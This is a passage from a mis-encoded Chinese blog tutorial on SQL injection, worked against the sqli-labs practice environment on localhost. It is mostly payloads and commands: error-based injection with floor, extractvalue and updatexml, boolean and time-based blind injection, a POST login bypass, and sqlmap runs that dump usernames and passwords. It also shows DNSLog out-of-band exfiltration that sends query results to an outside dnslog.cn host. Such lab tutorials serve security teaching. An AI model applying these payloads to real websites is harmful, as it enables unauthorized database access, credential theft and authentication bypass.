AND &#39;aMBL&#39;&#x3D;&#39;aMBL</span><br><span class="line"></span><br><span class="line">    Type: UNION query</span><br><span class="line">    Title: Generic UNION query (NULL) - 3 columns</span><br><span class="line">    Payload: id&#x3D;-3115&#39; UNION ALL SELECT NULL,CONCAT(0x7162717a71,0x7372786d534b54684f795a787a4e736962676675516963714d7759496751777a4b41614f57426376,0x7176767a71),NULL-- -</span><br></pre></td></tr></table></figure><h1 id="GET-æŠ¥é”™æ³¨å…¥"><a href="#GET-æŠ¥é”™æ³¨å…¥" class="headerlink" title="GET æŠ¥é”™æ³¨å…¥"></a>GET æŠ¥é”™æ³¨å…¥</h1><p>åœ¨æ²¡æœ‰æ•°æ®å›æ˜¾çš„æ—¶å€™ï¼Œé€šè¿‡æŠ¥é”™æ¥æ˜¾ç¤ºå…·ä½“çš„ä¿¡æ¯</p><p>1.<strong>floor()å‡½æ•°</strong></p><p>åŸç†ï¼š<a href="https://blog.csdn.net/shuteer_xu/article/details/104438405">MysqlæŠ¥é”™æ³¨å…¥ä¹‹å‡½æ•°åˆ†æ</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">æ³¨å…¥å…¬å¼ï¼ˆPayloadä¸ºè‡ªå·±æƒ³è·å–å†…å®¹çš„è„šæœ¬ï¼‰ï¼š</span><br><span class="line">and(select 1 from (select count(*),concat(concat(payload),floor(rand(0)*2))x from information_schema.tables group by x)y)</span><br><span class="line">and(select 1 from (select count(*),concat(concat(database(),0x7e),floor(rand(0)*2))x from information_schema.tables group by x)y)</span><br><span class="line">&#x2F;&#x2F;æš´åº“</span><br><span class="line">and(select 1 from (select count(*),concat(concat((select concat(table_name) from information_schema.tables where table_schema&#x3D;&quot;security&quot; limit 3,1),0x7e),floor(rand(0)*2))x from information_schema.tables group by x)y)</span><br><span class="line">&#x2F;&#x2F;æŸ¥è¯¢è¡¨</span><br><span class="line">and(select 1 from (select count(*),concat(concat((select concat(column_name) from information_schema.columns where table_schema&#x3D;&quot;security&quot; and table_name&#x3D;&quot;users&quot; limit 1,1),0x7e),floor(rand(0)*2))x from information_schema.tables group by x)y)</span><br><span class="line">&#x2F;&#x2F;æŸ¥è¯¢å­—æ®µ</span><br><span class="line">and(select 1 from (select count(*),concat(concat((select concat(username,0x7e,password,0x7e) from security.users limit 1,1),0x7e),floor(rand(0)*2))x from information_schema.tables group by x)y)</span><br><span class="line">&#x2F;&#x2F;æŸ¥è¯¢å­—æ®µå†…å®¹</span><br></pre></td></tr></table></figure><p>2.<strong>extractvalue()å‡½æ•°</strong></p><p>extractvalue(ç›®æ ‡xmlæ–‡æ¡£ï¼Œxmlè·¯å¾„) :å¯¹XMLæ–‡æ¡£è¿›è¡ŒæŸ¥è¯¢çš„å‡½æ•°</p><p>ç¬¬äºŒä¸ªå‚æ•° xmlä¸­çš„ä½ç½®æ˜¯å¯æ“ä½œçš„åœ°æ–¹ï¼Œxmlæ–‡æ¡£ä¸­æŸ¥æ‰¾å­—ç¬¦ä½ç½®æ˜¯ç”¨ /xxx/xxx/xxx/â€¦è¿™ç§æ ¼å¼ï¼Œå¦‚æœæˆ‘ä»¬å†™å…¥å…¶ä»–æ ¼å¼ï¼Œå°±ä¼šæŠ¥é”™ï¼Œå¹¶ä¸”ä¼šè¿”å›æˆ‘ä»¬å†™å…¥çš„éæ³•æ ¼å¼å†…å®¹ï¼Œè€Œè¿™ä¸ªéæ³•çš„å†…å®¹å°±æ˜¯æˆ‘ä»¬æƒ³è¦æŸ¥è¯¢çš„å†…å®¹ã€‚</p><p>æ³¨æ„ï¼šextractvalue()èƒ½æŸ¥è¯¢å­—ç¬¦ä¸²çš„æœ€å¤§é•¿åº¦ä¸º32ï¼Œå°±æ˜¯è¯´å¦‚æœæˆ‘ä»¬æƒ³è¦çš„ç»“æœè¶…è¿‡32ï¼Œå°±éœ€è¦ç”¨substring()å‡½æ•°æˆªå–ï¼Œä¸€æ¬¡æŸ¥çœ‹32ä½</p><p>extractvalue() å‡½æ•°ä¸æ”¯æŒä½ç‰ˆæœ¬ mysql</p><p>payloadï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and extractvalue(1,concat(0x7e,(payload),0x7e))</span><br></pre></td></tr></table></figure><p><strong>3.updatexml()å‡½æ•°</strong></p><p>updatexml(ç›®æ ‡xmlæ–‡æ¡£ï¼Œxmlè·¯å¾„ï¼Œæ›´æ–°çš„å†…å®¹)ï¼šå¯¹xmlæ–‡æ¡£è¿›è¡Œæ›´æ–°çš„å‡½æ•°</p><p>updatexmlå’Œä¸Šé¢çš„extractvlaueå‡½æ•°åŸºæœ¬ä¸Šç›¸å·®ä¸å¤§ï¼Œç”¨æ³•ä¹Ÿç›¸åŒ</p><p>æ³¨ï¼šé«˜ç‰ˆæœ¬çš„mysqlå·²ç»ä¿®å¤äº†è¯¥bug</p><p>payloadï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and updatexml(1,concat(0x7e,(payload),0x7e),1)</span><br></pre></td></tr></table></figure><h1 id="GET-å¸ƒå°”ç›²æ³¨"><a href="#GET-å¸ƒå°”ç›²æ³¨" class="headerlink" title="GET å¸ƒå°”ç›²æ³¨"></a>GET å¸ƒå°”ç›²æ³¨</h1><p>åœ¨æ²¡æœ‰æŠ¥é”™ä¿¡æ¯æ—¶ï¼Œæ ¹æ®é¡µé¢å›æ˜¾æƒ…å†µä¸åŒè€ƒè™‘å¸ƒå°”ç›²æ³¨</p><h2 id="æ‰‹åŠ¨æµ‹è¯•-1"><a href="#æ‰‹åŠ¨æµ‹è¯•-1" class="headerlink" title="æ‰‹åŠ¨æµ‹è¯•"></a>æ‰‹åŠ¨æµ‹è¯•</h2><p><strong>1.æ£€æµ‹æ˜¯å¦å­˜åœ¨æ³¨å…¥ç‚¹</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;sqlilabs&#x2F;Less-8&#x2F;?id&#x3D;1     #é¡µé¢æ­£å¸¸æ˜¾ç¤º</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201130203312421.png" alt="image-20201130203312421"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;sqlilabs&#x2F;Less-8&#x2F;?id&#x3D;1&#39;    #æ— æŠ¥é”™ä¿¡æ¯ï¼Œä½†ä¸è¿”å›&quot;You are in......&quot;</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201130203507136.png" alt="image-20201130203507136"></p><p><strong>2.åˆ¤æ–­å½“å‰æ•°æ®åº“çš„é•¿åº¦</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;sqlilabs&#x2F;Less-8&#x2F;?id&#x3D;1&#39; and length(database()) &gt; 5--+</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201130204339111.png" alt="image-20201130204339111"></p><p><strong>length(str)</strong>      è¿”å›å­—ç¬¦ä¸²é•¿åº¦</p><p>é¡µé¢æ˜¾ç¤ºæ­£å¸¸ï¼Œè¯´æ˜åº“åé•¿åº¦å¤§äº5</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;sqlilabs&#x2F;Less-8&#x2F;?id&#x3D;1&#39; and length(database()) &gt; 10--+</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201130204918453.png" alt="image-20201130204918453"></p><p>ç»§ç»­åˆ¤æ–­åº“åé•¿åº¦ï¼Œæ­¤é¡µé¢è¡¨ç¤ºå…¶å°äº10</p><p>ç¼©å°èŒƒå›´åˆ¤æ–­ï¼Œå¾—å‡ºå½“å‰åº“åé•¿åº¦ä¸º8</p><p><strong>3.åˆ¤æ–­å½“å‰æ•°æ®åº“çš„ç¬¬ä¸€ä¸ªå­—ç¬¦</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;sqlilabs&#x2F;Less-8&#x2F;?id&#x3D;1&#39; and ascii(substr(database(),1,1)) &#x3D; 115--+</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201130205353557.png" alt="image-20201130205353557"></p><p><strong>ASCII(s)</strong>      è¿”å›å­—ç¬¦ä¸² s çš„ç¬¬ä¸€ä¸ªå­—ç¬¦çš„ ASCII ç </p><p><strong>SUBSTR(s, n, len)</strong>      ä»å­—ç¬¦ä¸² s çš„ n ä½ç½®æˆªå–é•¿åº¦ä¸º len çš„å­å­—ç¬¦ä¸²</p><p>é¡µé¢æ˜¾ç¤ºæ­£å¸¸ï¼Œè¯´æ˜å½“å‰æ•°æ®åº“çš„ç¬¬ä¸€ä¸ªå­—ç¬¦çš„asciiç æ˜¯115ï¼Œå¯¹åº”s</p><p>â€¦â€¦.æ›´æ”¹ä½ç½®ï¼Œé€æ­¥å¾—å‡ºåº“åsecurity</p><p>â€¦â€¦ä»¥æ­¤ç±»æ¨ï¼Œå¾—å‡ºå…¶ä»–æ•°æ®</p><h2 id="åˆ©ç”¨burpsuiteæµ‹è¯•"><a href="#åˆ©ç”¨burpsuiteæµ‹è¯•" class="headerlink" title="åˆ©ç”¨burpsuiteæµ‹è¯•"></a><strong>åˆ©ç”¨burpsuiteæµ‹è¯•</strong></h2><p>å¯¹ä¸Šé¢ç¬¬ä¸‰æ­¥è¿›è¡ŒæŠ“åŒ…ï¼Œä½¿ç”¨intruderæ¨¡å—</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201209162311335.png" alt="image-20201209162311335"></p><p>è®¾ç½®payloads</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201209162508699.png" alt="image-20201209162508699"></p><p>start attack</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201209163040562.png" alt="image-20201209163040562"></p><h1 id="GET-æ—¶é—´ç›²æ³¨"><a href="#GET-æ—¶é—´ç›²æ³¨" class="headerlink" title="GET æ—¶é—´ç›²æ³¨"></a>GET æ—¶é—´ç›²æ³¨</h1><p>å½“é¡µé¢å›æ˜¾å†…å®¹å®Œå…¨ä¸€è‡´ï¼Œè€ƒè™‘æ—¶é—´ç›²æ³¨</p><h2 id="æ‰‹åŠ¨æµ‹è¯•-2"><a href="#æ‰‹åŠ¨æµ‹è¯•-2" class="headerlink" title="æ‰‹åŠ¨æµ‹è¯•"></a>æ‰‹åŠ¨æµ‹è¯•</h2><p><strong>1.æ£€æµ‹æ˜¯å¦å­˜åœ¨æ³¨å…¥ç‚¹</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;sqlilabs&#x2F;Less-9&#x2F;?id&#x3D;1&#39; and if(1&#x3D;0,1,sleep(10))--+</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201129174459638.png" alt="image-20201129174459638"></p><p><strong>ifï¼ˆexpression,a,bï¼‰</strong>  expressionæ¡ä»¶ä¸ºçœŸè¿”å›a,æ¡ä»¶ä¸ºå‡è¿”å›b</p><p>F12æŸ¥çœ‹networkä¿¡æ¯ï¼Œå¯ä»¥çœ‹åˆ°å»¶è¿Ÿäº†10ç§’ï¼Œè¯æ˜å­˜åœ¨æ³¨å…¥ç‚¹</p><p><strong>2.åˆ¤æ–­å½“å‰æ•°æ®åº“çš„é•¿åº¦</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;sqlilabs&#x2F;Less-9&#x2F;?id&#x3D;1&#39; and if(length(database())&#x3D;8,sleep(10),1)--+</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201129175046395.png" alt="image-20201129175046395"></p><p>å»¶è¿Ÿ10ç§’ï¼Œè¯´æ˜åˆ¤æ–­æˆåŠŸï¼Œå½“å‰æ•°æ®åº“é•¿åº¦ä¸º8</p><p><strong>3.åˆ¤æ–­å½“å‰æ•°æ®åº“çš„ç¬¬ä¸€ä¸ªå­—ç¬¦</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;sqlilabs&#x2F;Less-9&#x2F;?id&#x3D;1&#39; and if(ascii(substr(database(),1,1))&#x3D;115,sleep(10),1)--+</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201129175759624.png" alt="image-20201129175759624"></p><p>å»¶è¿Ÿ10ç§’ï¼Œè¯´æ˜å½“å‰æ•°æ®åº“çš„ç¬¬ä¸€ä¸ªå­—ç¬¦çš„asciiç æ˜¯115ï¼Œå¯¹åº”s</p><p>â€¦â€¦.æ›´æ”¹ä½ç½®ï¼Œé€æ­¥å¾—å‡ºåº“åsecurity</p><p>â€¦â€¦ä»¥æ­¤ç±»æ¨ï¼Œå¾—å‡ºå…¶ä»–æ•°æ®</p><h2 id="Sqlmapä¸‹æµ‹è¯•"><a href="#Sqlmapä¸‹æµ‹è¯•" class="headerlink" title="Sqlmapä¸‹æµ‹è¯•"></a><strong>Sqlmapä¸‹æµ‹è¯•</strong></h2><p>æŸ¥è¯¢åº“å</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http:&#x2F;&#x2F;localhost&#x2F;sqlilabs&#x2F;Less-8&#x2F;?id&#x3D;1&quot; --technique B --dbs --batch   #å¸ƒå°”å‹ç›²æ³¨</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http:&#x2F;&#x2F;localhost&#x2F;sqlilabs&#x2F;Less-9&#x2F;?id&#x3D;1&quot; --technique T --dbs --batch   #æ—¶é—´ç›²æ³¨</span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Parameter: id (GET)</span><br><span class="line">    Type: boolean-based blind</span><br><span class="line">    Title: AND boolean-based blind - WHERE or HAVING clause</span><br><span class="line">    Payload: id&#x3D;1&#39; AND 1071&#x3D;1071 AND &#39;MFtC&#39;&#x3D;&#39;MFtC</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Parameter: id (GET)</span><br><span class="line">    Type: time-based blind</span><br><span class="line">    Title: MySQL &gt;&#x3D; 5.0.12 AND time-based blind (query SLEEP)</span><br><span class="line">    Payload: id&#x3D;1&#39; AND (SELECT 5530 FROM (SELECT(SLEEP(5)))VtGF) AND &#39;VpPN&#39;&#x3D;&#39;VpPN</span><br></pre></td></tr></table></figure><p>åç»­æ­¥éª¤ä¸ä¸Šè¿°Sqlmapæµ‹è¯•æ–¹æ³•ä¸€è‡´</p><p>â€¦â€¦</p><h1 id="POST-æŠ¥é”™æ³¨å…¥"><a href="#POST-æŠ¥é”™æ³¨å…¥" class="headerlink" title="POST æŠ¥é”™æ³¨å…¥"></a>POST æŠ¥é”™æ³¨å…¥</h1><h2 id="æ‰‹åŠ¨æµ‹è¯•-3"><a href="#æ‰‹åŠ¨æµ‹è¯•-3" class="headerlink" title="æ‰‹åŠ¨æµ‹è¯•"></a>æ‰‹åŠ¨æµ‹è¯•</h2><p><strong>é€šè¿‡SQLçš„orè¿ç®—ç¬¦ï¼Œæ„é€ ä¸‡èƒ½å¯†ç ï¼Œåˆ¤æ–­æ˜¯å¦ä¸ºæ³¨å…¥ç‚¹</strong></p><p>åˆ¤æ–­æ³¨å…¥ç‚¹ï¼ˆæ·»åŠ å•å¼•å·åæŠ¥é”™ï¼‰</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201203161208957.png" alt="image-20201203161208957"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname&#x3D;admin&#39; or 1&#x3D;1--+&amp;passwd&#x3D;123456 æ„é€ ä¸‡èƒ½å¯†ç </span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201202230449498.png" alt="image-20201202230449498"></p><p>åˆ¤æ–­å‡ºæ³¨å…¥ç‚¹ä¹‹åï¼Œå°±å¯ä»¥åˆ©ç”¨æŠ¥é”™æ³¨å…¥,å¸ƒå°”ç›²æ³¨ï¼Œæ—¶é—´ç›²æ³¨ç­‰ï¼Œè·å¾—æˆ‘ä»¬æƒ³è¦çš„ç›¸å…³ä¿¡æ¯</p><p>å¦‚åˆ©ç”¨æŠ¥é”™æ³¨å…¥è·å–å½“å‰æ•°æ®åº“</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname&#x3D;admin&#39; or extractvalue(1,concat(0x7e,(database()),0x7e))--+&amp;passwd&#x3D;123456</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201202230243117.png" alt="image-20201202230243117"></p><p>â€¦â€¦</p><h2 id="åˆ©ç”¨burp-suiteæµ‹è¯•"><a href="#åˆ©ç”¨burp-suiteæµ‹è¯•" class="headerlink" title="åˆ©ç”¨burp suiteæµ‹è¯•"></a><strong>åˆ©ç”¨burp suiteæµ‹è¯•</strong></h2><p><strong>ä½¿ç”¨ProxyåŠŸèƒ½æŠ“åŒ…</strong></p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201202230900185.png" alt="image-20201202230900185"></p><p><strong>ä½¿ç”¨RepeateråŠŸèƒ½</strong></p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201202231127632.png" alt="image-20201202231127632"></p><p><strong>æ„é€ ä¸‡èƒ½å¯†ç </strong></p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201202231557574.png" alt="image-20201202231557574"></p><h2 id="åˆ©ç”¨Sqlmapæµ‹è¯•-1"><a href="#åˆ©ç”¨Sqlmapæµ‹è¯•-1" class="headerlink" title="åˆ©ç”¨Sqlmapæµ‹è¯•"></a>åˆ©ç”¨Sqlmapæµ‹è¯•</h2><p>å¤åˆ¶Burpsuiteæˆªæ–­çš„HTTPè¯·æ±‚æ•°æ®åŒ…åˆ°æ–‡æœ¬æ–‡ä»¶ä¸­ï¼Œä½¿ç”¨<strong>Sqlmap -r æ–‡ä»¶è·¯å¾„ -p æŒ‡å®šæ¢æµ‹å‚æ•°</strong></p><p>è¿™é‡Œå¤åˆ¶æ•°æ®åŒ…è‡³sqlmapç›®å½•ä¸‹çš„target.txtæ–‡ä»¶</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201203000201440.png" alt="image-20201203000201440"></p><p>åœ¨Sqlmapä¸­æŒ‡å®šæ¢æµ‹æŠ€æœ¯ä½¿ç”¨â€“technique  BEUSTQ</p><p><strong>â€“technique E</strong> åŸºäºæŠ¥é”™æ³¨å…¥</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -r target.txt -p passwd --technique E</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201203000800804.png" alt="image-20201203000800804"></p><p><strong>payloadï¼š</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Parameter: passwd (POST)</span><br><span class="line">    Type: error-based</span><br><span class="line">    Title: MySQL &gt;&#x3D; 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)</span><br><span class="line">    Payload: uname&#x3D;admin&amp;passwd&#x3D;123456&#39; AND GTID_SUBSET(CONCAT(0x716a766b71,(SELECT (ELT(7356&#x3D;7356,1))),0x7176706a71),7356)-- lpbw&amp;submit&#x3D;Submit</span><br></pre></td></tr></table></figure><p>å…¶åæ·»åŠ å‚æ•°ä»¥è·å–å…¶ä»–ä¿¡æ¯</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -r target.txt -p passwd --technique E --dbs</span><br><span class="line">python sqlmap.py -r target.txt -p passwd --technique E --current-db --current-user --banner</span><br><span class="line">python sqlmap.py -r target.txt -p passwd --technique E -D security --tables</span><br><span class="line">python sqlmap.py -r target.txt -p passwd --technique E -D security -T users --columns</span><br><span class="line">python sqlmap.py -r target.txt -p passwd --technique E -D security -T users -C password,username --dump</span><br></pre></td></tr></table></figure><h1 id="POST-å¸ƒå°”ã€æ—¶é—´ç›²æ³¨"><a href="#POST-å¸ƒå°”ã€æ—¶é—´ç›²æ³¨" class="headerlink" title="POST å¸ƒå°”ã€æ—¶é—´ç›²æ³¨"></a>POST å¸ƒå°”ã€æ—¶é—´ç›²æ³¨</h1><p>åœ¨adminåæ·»åŠ å•å¼•å·ç­‰å­—ç¬¦åå¹¶æ— æŠ¥é”™ä¿¡æ¯ï¼Œè€ƒè™‘ç›²æ³¨</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201203162418352.png" alt="image-20201203162418352"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">uname&#x3D;&#39;or (payload)--+&amp;passwd&#x3D;</span><br><span class="line">uname&#x3D;&#39;&#x3D;(payload)&#x3D;&#39; &#39;--+&amp;passwd&#x3D;</span><br><span class="line">&#x2F;&#x2F;å¦‚ uname&#x3D;&#39;or (length(database())&#x3D;8)--+&amp;passwd&#x3D;</span><br><span class="line">uname&#x3D;&#39;&#x3D;(ascii(substr(database(),1,1))&#x3D;115)&#x3D;&#39; &#39;--+&amp;passwd&#x3D;</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201210213730100.png" alt="image-20201210213730100"></p><p><strong>åˆ©ç”¨burpsuiteæŠ“å–æ•°æ®åŒ…</strong>ï¼Œåœ¨å­˜åœ¨æ³¨å…¥ç‚¹POSTæäº¤çš„å‚æ•°ååŠ å…¥åˆ¤æ–­è¯­å¥ï¼Œæ ¹æ®Responseçš„ç»“æœè·å–ä¿¡æ¯</p><p>å¦‚ä¸‹å›¾ï¼Œåˆ¤æ–­å½“å‰æ•°æ®åº“é•¿åº¦æ˜¯å¦å¤§äº5</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201203164042900.png" alt="image-20201203164042900"></p><p>å†åˆ¤æ–­å…¶é•¿åº¦æ˜¯å¦å¤§äº10</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201203164228389.png" alt="image-20201203164228389"></p><p>æœ€ååˆ¤æ–­å…¶é•¿åº¦ä¸º8ï¼Œä»¥æ­¤ç±»æ¨ï¼Œåˆ¤æ–­å…¶ä»–ä¿¡æ¯â€¦â€¦</p><p>åŒæ ·ï¼Œä¹Ÿå¯ä»¥è¿›è¡ŒåŸºäºæ—¶é—´çš„ç›²æ³¨</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname&#x3D;&#39;or (if(ascii(substr(database(),1,1))&#x3D;115,sleep(5),1))--+&amp;passwd&#x3D;</span><br></pre></td></tr></table></figure><p>åœ¨å­˜åœ¨æ³¨å…¥ç‚¹POSTæäº¤çš„å‚æ•°åæ·»åŠ åˆ¤æ–­è¯­å¥ï¼Œæ ¹æ®å“åº”æ—¶é—´è·å–ä¿¡æ¯</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201203170636591.png" alt="image-20201203170636591"></p><p>ç»§ç»­åˆ¤æ–­</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201203170851871.png" alt="image-20201203170851871"></p><p>æœ€ååˆ¤æ–­å…¶é•¿åº¦ä¸º8ï¼Œä»¥æ­¤ç±»æ¨ï¼Œåˆ¤æ–­å…¶ä»–ä¿¡æ¯â€¦â€¦</p><p><strong>åˆ©ç”¨Sqlmapæµ‹è¯•</strong></p><p>åŒæ ·ï¼Œè¿™é‡Œå¤åˆ¶æ•°æ®åŒ…è‡³target.txt,æ¢æµ‹æŠ€æœ¯ä¸ºâ€“technique B/T</p><h1 id="DNSLogæ³¨å…¥"><a href="#DNSLogæ³¨å…¥" class="headerlink" title="DNSLogæ³¨å…¥"></a>DNSLogæ³¨å…¥</h1><p>åˆ©ç”¨åœºæ™¯ï¼š</p><p>ä¸ç®¡æ˜¯å¸ƒå°”ç±»å‹ç›²æ³¨è¿˜æ˜¯æ—¶é—´ç›²æ³¨ï¼Œéƒ½éœ€è¦å‘é€å¤§é‡çš„æ•°æ®åŒ…å»åˆ¤æ–­æ•°æ®ï¼Œè€Œè¿™å¾ˆå¯èƒ½ä¼šè§¦å‘WAFçš„é˜²æŠ¤ï¼Œå› æ­¤å¯¼è‡´è¢«å°IPã€‚æ‰€ä»¥ï¼Œå¦‚æœæ¡ä»¶å…è®¸ï¼Œæˆ‘ä»¬å¯ä»¥ç»“åˆDNSlogæ¥å¿«é€Ÿçš„å›æ˜¾æ•°æ®ã€‚MySQLæ•°æ®åº“ï¼Œé€šè¿‡DNSlogç›²æ³¨éœ€è¦ç”¨åˆ° load_file() å‡½æ•°ï¼Œè¯¥å‡½æ•°ä¸ä»…èƒ½åŠ è½½æœ¬åœ°æ–‡ä»¶ï¼ŒåŒæ—¶ä¹Ÿèƒ½å¯¹URLå‘èµ·è¯·æ±‚ã€‚å› ä¸ºéœ€è¦ä½¿ç”¨ load_file() å‡½æ•°ï¼Œæ‰€ä»¥éœ€è¦rootæƒé™ï¼Œå¹¶ä¸” secure_file_priv éœ€è¦ä¸ºç©ºã€‚</p><p>åŸç†ï¼š</p><p>æˆ‘ä»¬è¾“å…¥åŸŸåä¹‹å ï¼Œéœ€è¦å‘DNSæœåŠ¡å™¨æŸ¥è¯¢å¯¹åº”çš„IPåœ°å€ï¼ŒDNSæœåŠ¡å™¨åœ¨è§£æçš„æ—¶å€™ä¼šç•™ä¸‹è®°å½•ï¼Œäº§ç”Ÿæ—¥å¿—ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡æŸ¥çœ‹æ—¥å¿—æ¥è·å–ç›¸åº”ä¿¡æ¯</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201213182240957.png" alt="image-20201213182240957"></p><p>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># æŸ¥è¯¢å½“å‰ç”¨æˆ·å</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqlilabs&#x2F;Less-1&#x2F;?id&#x3D;1&#39; and (select load_file(concat(&#39;\\\\&#39;,(select hex(user())),&#39;.5srmkc.dnslog.cn&#x2F;abc&#39;))) --+</span><br><span class="line"></span><br><span class="line"># æŸ¥çœ‹å½“å‰æ•°æ®åº“å</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqlilabs&#x2F;Less-1&#x2F;?id&#x3D;1&#39; and (select load_file(concat(&#39;\\\\&#39;,(select database()),&#39;.5srmkc.dnslog.cn&#x2F;abc&#39;))) --+</span><br></pre></td></tr></table></figure><p>ç›¸å…³ç½‘ç«™ï¼š<a href="http://www.dnslog.cn/">www.dnslog.cn</a></p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201213183240282.png" alt="image-20201213183240282"></p><p>ç›¸å…³ç½‘ç«™ï¼š<a href="https://www.bejson.com/convert/ox2str/">https://www.bejson.com/convert/ox2str/</a></p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201213192730846.png" alt="image-20201213192730846"></p><h1 id="HTTPå¤´ä¸­çš„SQLæ³¨å…¥"><a 